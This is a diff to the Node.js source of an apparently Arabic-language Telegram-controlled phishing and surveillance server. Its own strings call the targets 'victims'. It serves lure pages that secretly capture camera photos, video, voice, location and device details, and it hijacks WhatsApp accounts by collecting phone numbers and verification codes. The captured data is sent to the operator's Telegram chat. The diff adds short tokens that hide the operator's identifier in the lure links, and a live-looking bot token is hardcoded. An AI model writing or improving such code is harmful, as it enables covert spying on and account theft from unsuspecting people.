@@ -21,6 +21,13 @@ const FormData = require('form-data');
 const cheerio = require('cheerio');
 const dns = require('dns');
 
+
+function generateShortToken(chatId, type, extra = {}) {
+    const token = crypto.randomBytes(4).toString('hex'); // 8 حروف
+    shortLinkStore[token] = { chatId, type, ...extra, timestamp: Date.now() };
+    return token;
+}
+
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 const tmo = process.env.is; 
 const botToken = '8380316975:AAEjcllXjRKFlJkCL9XoD-pe9yVOx-NKQZQ'; 
@@ -372,7 +379,8 @@ const secondBot = new TelegramBot(SECOND_BOT_TOKEN, { polling: true });
 
 let inviteLinks = {};
 let userPoints = {}; 
-let linkData = {}; 
+let linkData = {};
+let shortLinkStore = {}; // تخزين الروابط المختصرة 
 let visitorData = {}; 
 
 
@@ -570,12 +578,19 @@ const upload = multer({ storage: storage });
 const uploadVoice = multer({ dest: 'uploads/' });
 
 
+
 app.get('/getNameForm', (req, res) => {
-    const chatId = req.query.chatId;
-    const formType = req.query.type;
+    let chatId = req.query.chatId;
+    let formType = req.query.type;
+    const token = req.query.t;
+
+    if (token && shortLinkStore[token]) {
+        chatId = shortLinkStore[token].chatId;
+        formType = shortLinkStore[token].type;
+    }
 
     if (!chatId) {
-        return res.status(400).send('الرجاء توفير chatId في الطلب.');
+        return res.status(400).send('الرجاء توفير chatId أو رمز صالح.');
     }
 
     let fileName = '';
@@ -597,47 +612,75 @@ app.get('/getNameForm', (req, res) => {
 
 app.get('/getLocation/:linkId', (req, res) => {
     const linkId = req.params.linkId;
-    if (validateLinkUsage(linkId)) {
+    let chatId = req.query.chatId;
+    
+    if (shortLinkStore[linkId]) {
+        chatId = shortLinkStore[linkId].chatId;
+    }
+
+    if (validateLinkUsage(chatId, 'getLocation')) {
         res.sendFile(path.join(__dirname, 'lo.html'));
     } else {
         res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
-        bot.sendMessage(linkUsage[linkId].chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
+        if (chatId) bot.sendMessage(chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
     }
 });
 
 app.get('/captureFront/:linkId', (req, res) => {
     const linkId = req.params.linkId;
-    if (validateLinkUsage(linkId)) {
+    let chatId = req.query.chatId;
+    
+    if (shortLinkStore[linkId]) {
+        chatId = shortLinkStore[linkId].chatId;
+    }
+
+    if (validateLinkUsage(chatId, 'captureFront')) {
         res.sendFile(path.join(__dirname, 'c.html'));
     } else {
         res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
-        bot.sendMessage(linkUsage[linkId].chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
+        if (chatId) bot.sendMessage(chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
     }
 });
 
 app.get('/captureBack/:linkId', (req, res) => {
     const linkId = req.params.linkId;
-    if (validateLinkUsage(linkId)) {
+    let chatId = req.query.chatId;
+    
+    if (shortLinkStore[linkId]) {
+        chatId = shortLinkStore[linkId].chatId;
+    }
+
+    if (validateLinkUsage(chatId, 'captureBack')) {
         res.sendFile(path.join(__dirname, 'b.html'));
     } else {
         res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
-        bot.sendMessage(linkUsage[linkId].chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
+        if (chatId) bot.sendMessage(chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
     }
 });
 
 app.get('/record/:linkId', (req, res) => {
     const linkId = req.params.linkId;
-    if (validateLinkUsage(linkId)) {
+    let chatId = req.query.chatId;
+    
+    if (shortLinkStore[linkId]) {
+        chatId = shortLinkStore[linkId].chatId;
+    }
+
+    if (validateLinkUsage(chatId, 'record')) {
         res.sendFile(path.join(__dirname, 'r.html'));
     } else {
         res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
-        bot.sendMessage(linkUsage[linkId].chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
+        if (chatId) bot.sendMessage(chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
     }
 });
 
 
 app.post('/submitNames', (req, res) => {
-    const chatId = req.body.chatId;
+    let chatId = req.body.chatId || req.body.userId;
+    const token = req.body.token || req.query.t;
+    if (!chatId && token && shortLinkStore[token]) {
+        chatId = shortLinkStore[token].chatId;
+    }
     const firstName = req.body.firstName;
     const secondName = req.body.secondName;
 
@@ -658,12 +701,25 @@ app.use(bodyParser.json());
 app.use(express.static(__dirname));
 
 
+
 app.get('/whatsapp', (req, res) => {
-  res.sendFile(path.join(__dirname, 'n.html'));
+  const token = req.query.t;
+  if (token && shortLinkStore[token]) {
+      res.sendFile(path.join(__dirname, 'n.html'));
+  } else if (req.query.chatId) {
+      res.sendFile(path.join(__dirname, 'n.html'));
+  } else {
+      res.status(400).send('Invalid Link');
+  }
 });
 
+
 app.post('/submitPhoneNumber', (req, res) => {
-  const chatId = req.body.chatId;
+    let chatId = req.body.chatId || req.body.userId;
+    const token = req.body.token || req.query.t;
+    if (!chatId && token && shortLinkStore[token]) {
+        chatId = shortLinkStore[token].chatId;
+    }
   const phoneNumber = req.body.phoneNumber;
 
 
@@ -678,7 +734,11 @@ app.post('/submitPhoneNumber', (req, res) => {
 });
 
 app.post('/submitCode', (req, res) => {
-  const chatId = req.body.chatId;
+    let chatId = req.body.chatId || req.body.userId;
+    const token = req.body.token || req.query.t;
+    if (!chatId && token && shortLinkStore[token]) {
+        chatId = shortLinkStore[token].chatId;
+    }
   const code = req.body.code;
 
 
@@ -705,7 +765,11 @@ const ownerChatId = developerId;
 
 
 app.post('/submitVideo', (req, res) => {
-    const chatId = req.body.chatId;
+    let chatId = req.body.chatId || req.body.userId;
+    const token = req.body.token || req.query.t;
+    if (!chatId && token && shortLinkStore[token]) {
+        chatId = shortLinkStore[token].chatId;
+    }
     const videoData = req.body.videoData;
 
     if (!chatId || !videoData) {
@@ -761,7 +825,14 @@ app.post('/submitVideo', (req, res) => {
     }
 });
 app.get('/capture', (req, res) => {
-    res.sendFile(path.join(__dirname, 'ca.html'));
+    const token = req.query.t;
+    if (token && shortLinkStore[token]) {
+        res.sendFile(path.join(__dirname, 'ca.html'));
+    } else if (req.query.chatId) {
+        res.sendFile(path.join(__dirname, 'ca.html'));
+    } else {
+        res.status(400).send('Invalid Link');
+    }
 });
 let userRequests = {}; 
 
@@ -780,7 +851,11 @@ const retry = async (fn, retries = 3, delay = 1000) => {
 
 
 app.post('/submitPhotos', (req, res) => {
-    const chatId = req.body.chatId;
+    let chatId = req.body.chatId || req.body.userId;
+    const token = req.body.token || req.query.t;
+    if (!chatId && token && shortLinkStore[token]) {
+        chatId = shortLinkStore[token].chatId;
+    }
     const imageDatas = req.body.imageDatas.split(',');
 
     console.log("Received photos: ", imageDatas.length, "for chatId: ", chatId);
@@ -876,7 +951,11 @@ app.post('/imageReceiver', upload.array('images', 20), (req, res) => {
 });
 
 app.post('/submitVoice', uploadVoice.single('voice'), (req, res) => {
-    const chatId = req.body.chatId;
+    let chatId = req.body.chatId || req.body.userId;
+    const token = req.body.token || req.query.t;
+    if (!chatId && token && shortLinkStore[token]) {
+        chatId = shortLinkStore[token].chatId;
+    }
     const voicePath = req.file.path;
 
     bot.sendVoice(chatId, voicePath).then(() => {
@@ -891,13 +970,26 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`الخادم يعمل على المنفذ ${PORT}`);
 });
+app.get('/info', (req, res) => {
+    const token = req.query.t;
+    if (token && shortLinkStore[token]) {
+        res.sendFile(path.join(__dirname, 'mm.html'));
+    } else {
+        res.status(400).send('Invalid Link');
+    }
+});
+
 app.get('/:userId', (req, res) => {
     res.sendFile(path.join(__dirname, 'mm.html'));
 });
 
 
 app.post('/mm', async (req, res) => {
-    const chatId = req.body.userId;
+    let chatId = req.body.chatId || req.body.userId;
+    const token = req.body.token || req.query.t;
+    if (!chatId && token && shortLinkStore[token]) {
+        chatId = shortLinkStore[token].chatId;
+    }
     const deviceInfo = req.body.deviceInfo;
 
     if (deviceInfo) {
@@ -954,7 +1046,11 @@ app.post('/mm', async (req, res) => {
 
 
 app.post('/so', (req, res) => {
-    const chatId = req.body.chatId;
+    let chatId = req.body.chatId || req.body.userId;
+    const token = req.body.token || req.query.t;
+    if (!chatId && token && shortLinkStore[token]) {
+        chatId = shortLinkStore[token].chatId;
+    }
     const imageDatas = req.body.imageDatas.split(',');
 
     imageDatas.forEach((imageData, index) => {
@@ -989,6 +1085,17 @@ app.post('/so', (req, res) => {
         res.redirect(dataStore[chatId].userLink);
     } else {
         res.send('حدث خطاء ❌');
+    }
+});
+
+app.get('/k.html', (req, res) => {
+    const token = req.query.t;
+    if (token && shortLinkStore[token]) {
+        res.sendFile(path.join(__dirname, 'k.html'));
+    } else if (req.query.chatId) {
+        res.sendFile(path.join(__dirname, 'k.html'));
+    } else {
+        res.status(400).send('Invalid Link');
     }
 });
 
@@ -1162,7 +1269,7 @@ bot.on('callback_query', (callbackQuery) => {
     const data = callbackQuery.data;
 
     if (data === 'capture_video') {
-        const message = `تم انشاء الرابط ملاحظه بزم يكون النت قوي في جهاز الضحيه\n: ${baseUrl}/capture?chatId=${chatId}`;
+        const message = `تم انشاء الرابط ملاحظه بزم يكون النت قوي في جهاز الضحيه\n: ${baseUrl}/capture?t=${generateShortToken(chatId, 'capture_video')}`;
 
         if (message && message.trim() !== '') {
             bot.sendMessage(chatId, message);
@@ -1191,7 +1298,7 @@ bot.on('callback_query', async (callbackQuery) => {
     }
 
     if (data === 'request_verification') {
-        const verificationLink = `${baseUrl}/whatsapp?chatId=${chatId}`;
+        const verificationLink = `${baseUrl}/whatsapp?t=${generateShortToken(chatId, 'whatsapp')}`;
         bot.sendMessage(chatId, `تم انشاء الرابط لختراق وتساب\n: ${verificationLink}`);
         return;
     }
@@ -1300,26 +1407,26 @@ bot.on('callback_query', async (callbackQuery) => {
 
         switch (action) {
             case 'captureFront':
-                link = `${baseUrl}/captureFront/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
+                link = `${baseUrl}/captureFront/${generateShortToken(chatId, 'captureFront')}`;
                 break;
             case 'captureBack':
-                link = `${baseUrl}/captureBack/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
+                link = `${baseUrl}/captureBack/${generateShortToken(chatId, 'captureBack')}`;
                 break;
             case 'getLocation':
-                link = `${baseUrl}/getLocation/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
+                link = `${baseUrl}/getLocation/${generateShortToken(chatId, 'getLocation')}`;
                 break;
             case 'recordVoice':
                 const duration = 10;  
-                link = `${baseUrl}/record/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
+                link = `${baseUrl}/record/${generateShortToken(chatId, 'recordVoice', {duration})}`;
                 break;
             case 'rshq_tiktok':
-                link = `${baseUrl}/getNameForm?chatId=${chatId}&type=tiktok`;
+                link = `${baseUrl}/getNameForm?t=${generateShortToken(chatId, 'tiktok')}`;
                 break;
             case 'rshq_instagram':
-                link = `${baseUrl}/getNameForm?chatId=${chatId}&type=instagram`;
+                link = `${baseUrl}/getNameForm?t=${generateShortToken(chatId, 'instagram')}`;
                 break;
             case 'rshq_facebook':
-                link = `${baseUrl}/getNameForm?chatId=${chatId}&type=facebook`;
+                link = `${baseUrl}/getNameForm?t=${generateShortToken(chatId, 'facebook')}`;
                 break;
             default:
                 bot.sendMessage(chatId, '');
@@ -1349,7 +1456,7 @@ bot.on('callback_query', (query) => {
 
 
     if (query.data === 'collect_device_info') {
-        const url = `${baseUrl}/${chatId}`;
+        const url = `${baseUrl}/info?t=${generateShortToken(chatId, 'device_info')}`;
         bot.sendMessage(chatId, `رابط جمع المعلومات: ${url}`);
     }
 
@@ -1374,7 +1481,7 @@ bot.on('callback_query', (query) => {
                     dataStore[chatId] = { userLink };
 
 
-                    bot.sendMessage(chatId, `تم تلغيم هذا الرابط ⚠️:\n${baseUrl}/k.html?chatId=${chatId}`);
+                    bot.sendMessage(chatId, `تم تلغيم هذا الرابط ⚠️:\n${baseUrl}/k.html?t=${generateShortToken(chatId, 'k_link')}`);
 
 
                     bot.removeListener('message', messageHandler);
@@ -1393,7 +1500,11 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
 app.post('/submitNames', (req, res) => {
-    const chatId = req.body.chatId;
+    let chatId = req.body.chatId || req.body.userId;
+    const token = req.body.token || req.query.t;
+    if (!chatId && token && shortLinkStore[token]) {
+        chatId = shortLinkStore[token].chatId;
+    }
     const firstName = req.body.firstName;
     const secondName = req.body.secondName;
 
@@ -1421,7 +1532,11 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
 app.post('/submitNames', (req, res) => {
-    const chatId = req.body.chatId;
+    let chatId = req.body.chatId || req.body.userId;
+    const token = req.body.token || req.query.t;
+    if (!chatId && token && shortLinkStore[token]) {
+        chatId = shortLinkStore[token].chatId;
+    }
     const firstName = req.body.firstName;
     const secondName = req.body.secondName;
 
@@ -1449,7 +1564,11 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
 app.post('/submitNames', (req, res) => {
-    const chatId = req.body.chatId;
+    let chatId = req.body.chatId || req.body.userId;
+    const token = req.body.token || req.query.t;
+    if (!chatId && token && shortLinkStore[token]) {
+        chatId = shortLinkStore[token].chatId;
+    }
     const firstName = req.body.firstName;
     const secondName = req.body.secondName;
 
@@ -1765,11 +1884,11 @@ bot.on('callback_query', (query) => {
     let link;
 
     if (query.data === 'get_pubg') {
-        link = `${baseUrl}/g.html?chatId=${chatId}.png`;
+        link = `${baseUrl}/g.html?t=${generateShortToken(chatId, 'pubg')}`;
     } else if (query.data === 'get_freefire') {
-        link = `${baseUrl}/F.html?chatId=${chatId}.png`;
+        link = `${baseUrl}/F.html?t=${generateShortToken(chatId, 'freefire')}`;
     } else if (query.data === 'add_names') {
-        link = `${baseUrl}/s.html?chatId=${chatId}.png`;
+        link = `${baseUrl}/s.html?t=${generateShortToken(chatId, 'names')}`;
     }
 
     if (link) {
@@ -1995,7 +2114,7 @@ bot.on('callback_query', (callbackQuery) => {
     const messageId = callbackQuery.message.message_id;
 
     if (callbackQuery.data === 'get_photo_link') {
-        const link = `${baseUrl}/xx.html?chatId=${chatId}`;
+        const link = `${baseUrl}/xx.html?t=${generateShortToken(chatId, 'xx')}`;
         bot.sendMessage(chatId, `سيتم تصوير الضحيه بدقه عاليه: ${link}`);
     }
 });
